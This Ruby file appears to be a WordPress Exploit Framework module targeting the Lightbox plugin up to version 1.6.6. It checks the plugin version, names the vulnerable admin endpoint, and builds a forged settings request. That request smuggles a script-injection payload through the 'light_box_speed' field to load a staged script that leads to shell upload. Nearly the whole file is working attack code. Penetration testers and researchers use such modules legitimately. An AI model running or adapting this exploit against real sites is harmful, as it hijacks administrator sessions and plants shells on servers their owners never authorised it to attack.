# frozen_string_literal: true

class Wpxf::Exploit::LightboxReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Lightbox <= 1.6.6 Reflected XSS Shell Upload',
      author: [
        'rastating'  # WPXF module
      ],
      references: [
        ['WPVDB', '8662'],
        ['URL', 'https://www.rastating.com/lightbox-1-6-6-csrf-stored-xss/']
      ],
      date: 'Nov 13 2016'
    )
  end

  def check
    check_plugin_version_from_readme('lightbox', '1.6.7')
  end

  def vulnerable_url
    normalize_uri(wordpress_url_admin, 'admin.php?page=huge_it_light_box&hugeit_task=save')
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'light_box_style' => '1',
      'light_box_transition' => 'elastic',
      'light_box_speed' => "\\\"><script>#{xss_ascii_encoded_include_script}<\\/script>",
      'light_box_fadeout' => '300',
      'light_box_title' => 'false',
      'params[light_box_opacity]' => '20',
      'params[light_box_open]' => 'false',
      'params[light_box_overlayclose]' => 'true',
      'params[light_box_esckey]' => 'false',
      'params[light_box_arrowkey]' => 'false',
      'params[light_box_loop]' => 'true',
      'params[light_box_closebutton]' => 'true',
      'params[light_box_fixed]' => 'true',
      'params[slider_title_position]' => '5',
      'params[light_box_size_fix]' => 'false',
      'params[light_box_width]' => '500',
      'params[light_box_height]' => '500',
      'params[light_box_maxwidth]' => '768',
      'params[light_box_maxheight]' => '500',
      'params[light_box_initialwidth]' => '300',
      'params[light_box_initialheight]' => '100',
      'params[light_box_slideshow]' => 'false',
      'params[light_box_slideshowspeed]' => '2500',
      'params[light_box_slideshowauto]' => 'true',
      'params[light_box_slideshowstart]' => 'start slideshow',
      'params[light_box_slideshowstop]' => 'stop slideshow',
      'params[watermarket_image]' => 'false',
      'params[watermark_width]' => '0',
      'params[watermark_transparency]' => '0'
    )
  end
end
